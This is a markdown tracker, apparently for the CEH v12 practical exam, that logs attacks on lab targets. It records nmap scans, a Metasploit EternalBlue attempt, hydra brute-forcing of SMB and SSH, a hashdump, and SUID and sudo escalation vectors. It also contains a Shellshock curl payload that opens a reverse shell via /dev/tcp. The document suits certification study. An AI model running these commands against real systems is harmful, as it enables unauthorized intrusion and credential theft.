# CEH v12 Practical Exam - Live Findings Tracker

## 🎯 Quick Target Overview
| Target IP | OS | Status | Privilege | Notes |
|-----------|----|--------|-----------|-------|
| `192.168.1.10` | Windows 10 | ❌ Not Started | - | - |
| `192.168.1.20` | Linux | 🔄 Scanning | - | - |
| `192.168.1.30` | Windows Server | ✅ Compromised | Admin | - |

---

## 📝 Target: `[IP_ADDRESS]`

### 🔍 Reconnaissance
```bash
# Initial Scan
nmap -sS [IP] → Ports: [LIST]

# Service Scan  
nmap -sV -sC [IP] → 
- Port 80: Apache 2.4.38
- Port 445: SMB Windows 10
- Port 3389: RDP

# Vuln Scan
nmap --script vuln [IP] →
- [ ] ms17-010: VULNERABLE
- [ ] smb-vuln: Checked
```

### 🎯 Vulnerabilities Found
- [ ] **MS17-010** - Critical - SMB Service
- [ ] **Weak SSH Creds** - High - Port 22
- [ ] **Web Directory Traversal** - Medium - Port 80

### ⚔️ Exploitation Attempts
```bash
# Attempt 1: EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS [IP]
set LHOST [KALI_IP]
exploit → ❌ Failed - Patched?

# Attempt 2: SMB Login
hydra -L users.txt -P pass.txt smb://[IP] → 
- admin:admin123 ✅ WORKED
```

### 🏴‍☠️ Post-Exploitation
```bash
# Shell Access: ✅/❌
# User: administrator
# Privileges: Admin/User?

# Commands Run:
whoami /all → 
systeminfo → 
hashdump → 
```

### 🚀 Privilege Escalation
```bash
# Attempts:
- getsystem → ❌ Failed
- MS16-032 → ❌ Not applicable  
- Service misconfig → 🔄 Testing
```

### 📸 Evidence Captured
- [ ] Screenshot: Initial access
- [ ] Screenshot: Privilege escalation
- [ ] File: hashes.txt
- [ ] File: proof.txt

---

## 📝 Target: `[IP_ADDRESS]`

### 🔍 Reconnaissance
```bash
nmap -sS [IP] → Ports: 22,80,443

nmap -sV → 
- SSH: OpenSSH 7.4
- HTTP: Apache 2.4.6
```

### 🎯 Vulnerabilities Found
- [ ] **Shellshock** - Critical - CGI-BIN
- [ ] **SUID misconfig** - High - find command
- [ ] **Cron job** - Medium - writable

### ⚔️ Exploitation Attempts
```bash
# Attempt 1: Shellshock
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/[IP]/4444 0>&1" http://[IP]/cgi-bin/test.cgi → ❌

# Attempt 2: SSH brute force
hydra -l root -P rockyou.txt ssh://[IP] → 🔄 Running
```

### 🏴‍☠️ Post-Exploitation
```bash
# Access: ✅/❌
# User: www-data
# PrivEsc vectors found:
- find / -perm -4000 2>/dev/null → /usr/bin/find
- sudo -l → (www-data) NOPASSWD: /usr/bin/vim
```

---

## ⏱️ Time Tracker
| Time | Activity | Target | Result |
|------|----------|---------|--------|
| 00:00 | Initial scans | All | Found 3 targets |
| 00:15 | SMB enum | 192.168.1.10 | Creds found |
| 00:30 | Exploit attempt | 192.168.1.10 | Failed |
| 00:45 | SSH brute | 192.168.1.20 | Running |

---

## 🛠️ Tools Used Log
| Tool | Purpose | Target | Result |
|------|---------|---------|--------|
| Nmap | Port scan | All | ✅ |
| Enum4linux | SMB enum | .10 | ✅ |
| Hydra | SSH brute | .20 | 🔄 |
| Metasploit | Exploit | .10 | ❌ |

---

## 💡 Quick Notes Section

### Issues Encountered
- [ ] Firewall blocking port 445
- [ ] Antivirus detected meterpreter
- [ ] Need alternative payload

### Next Steps
1. Try different SMB exploit
2. Check web app on port 80
3. Test FTP anonymous login

### Credentials Found
```
Target .10: admin/admin123
Target .20: root/Password1 (from hydra)
```

---

## ✅ Final Checklist Before Submission

### For Each Target:
- [ ] Initial scan completed
- [ ] At least one vulnerability identified
- [ ] Exploitation attempted
- [ ] Access obtained (if possible)
- [ ] Privilege escalation attempted
- [ ] Evidence captured
- [ ] Screenshots taken

### Overall:
- [ ] All targets attacked
- [ ] Time managed effectively
- [ ] Notes are organized
- [ ] Proof files saved
- [ ] Report structured

---

**Exam Time Remaining:** [ ] hours [ ] minutes
